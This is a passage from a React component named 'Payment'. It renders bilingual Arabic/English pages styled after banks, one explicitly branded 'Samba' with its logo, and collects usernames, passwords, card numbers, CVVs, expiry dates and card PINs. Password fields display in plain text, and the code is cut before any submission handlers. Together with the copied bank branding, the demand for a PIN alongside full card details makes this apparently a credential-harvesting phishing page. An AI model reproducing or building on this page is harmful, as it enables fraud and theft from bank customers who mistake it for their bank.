                          "linear-gradient(-180deg, #F32E5E 0%, #B62938 100%)",
                      }
                    : {}
                }
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-white cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>

                <button
                  className="w-11/12 text-center  text-white py-2"
                  style={{
                    backgroundImage:
                      "linear-gradient(-180deg, #F32E5E 0%, #B62938 100%)",
                  }}
                >
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-white ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className=" text-white">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center  p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className=" text-white">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center  p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <button
                  className="text-white w-full  py-2 mt-5"
                  type="submit"
                  style={{
                    backgroundImage:
                      "linear-gradient(-180deg, #F32E5E 0%, #B62938 100%)",
                  }}
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : type === "Samba" ? (
        <div
          className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-center "
          style={{
            backgroundImage: 'url("/payment/sambabBG.png")',
            backgroundSize: "cover",
          }}
        >
          <div className="flex items-center gap-y-5 justify-center flex-col flex-1">
            <img src="/payment/sambalogo.png" />
            <span className="text-white md:text-xl">اهلا بعودتك</span>
          </div>
          <div className="w-full py-2  flex-1 px-2">
            <div
              className="w-full flex items-center p-1 justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-white text-sm cursor-pointer font-semibold w-1/2 text-center p-2 ${
                  state === "card" && "border-b-2 border-white"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer font-semibold w-1/2 text-center p-2 ${
                  state === "auth" && "border-b-2 border-white"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col h-full mb-5 items-start p-2 gap-y-5 bg-white "
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-blue-500 text-lg">
                    {checkMode("Username : ", "اسم المستخدم:").word}{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    required
                    style={{ borderBottom: "2px solid #7a7afa" }}
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-blue-500 text-lg">
                    {checkMode("Password : ", " كلمه المرور:").word}{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    required
                    style={{ borderBottom: "2px solid #7a7afa" }}
                  />
                </div>
                <div className="text-blue-500 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button className="w-11/12 text-center bg-blue-500 text-white py-2">
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3 bg-white flex-1 h-full"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-blue-500">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none "
                      style={{ border: "1px solid #7a7afa" }}
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-blue-500">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none "
                      dir="ltr"
                      maxLength={19}
                      style={{ border: "1px solid #7a7afa" }}
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-blue-500 ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                        style={{ border: "1px solid #7a7afa" }}
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className=" text-blue-500">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                        style={{ border: "1px solid #7a7afa" }}
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="w-fit text-left text-blue-600">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                        style={{ border: "1px solid #7a7afa" }}
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <button
                  className="text-white w-full bg-blue-500 py-2 mt-5"
                  type="submit"
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : null}
    </div>
  );
};

export default Payment;
